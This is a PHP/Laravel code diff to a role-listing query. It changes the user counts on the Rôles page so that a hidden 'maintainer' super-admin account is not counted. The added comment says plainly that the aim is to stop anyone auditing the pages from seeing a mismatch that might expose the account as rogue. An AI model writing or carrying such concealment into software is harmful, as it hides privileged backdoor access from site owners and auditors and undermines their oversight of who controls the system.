@@ -5,6 +5,7 @@ declare(strict_types=1);
 namespace App\Domain\Settings\Queries;
 
 use App\Models\Role;
+use App\Support\Access\HiddenAccount;
 use Illuminate\Contracts\Pagination\LengthAwarePaginator;
 
 /**
@@ -34,7 +35,15 @@ final class GetRolesList
     public function __invoke(string $search, int $perPage): LengthAwarePaginator
     {
         return Role::query()
-            ->withCount(['permissions', 'users'])
+            ->withCount([
+                'permissions',
+                // The maintainer login is invisible in the UI, so it must not
+                // be counted either — otherwise the Rôles page announces one
+                // more super-admin than the Utilisateurs page can show, and
+                // the discrepancy reads as a bug (or worse, as a rogue
+                // account) to whoever audits it. See HiddenAccount.
+                'users' => fn ($q) => HiddenAccount::hideUsers($q),
+            ])
             ->when($search !== '', function ($query) use ($search): void {
                 $query->where(function ($q) use ($search): void {
                     $q->where('name', 'ilike', "%{$search}%")
